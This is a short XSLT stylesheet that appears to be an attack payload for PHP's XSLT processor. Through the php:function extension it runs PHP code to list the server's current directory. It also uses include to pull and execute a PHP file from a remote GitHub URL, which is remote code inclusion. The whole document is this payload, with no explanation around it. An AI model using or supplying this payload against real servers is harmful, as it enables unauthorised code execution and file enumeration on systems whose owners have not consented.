<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="php:function('call_user_func', function(){
    return print_r(scandir('.'), true);
})"/>
    <xsl:value-of name="assert" select="php:function('scandir', '.')"/>
    
    <xsl:value-of select="php:function('include','https://raw.githubusercontent.com/tmieulet/secu/main/listFiles_lang.php')"/>
    
</xsl:template>
</xsl:stylesheet>
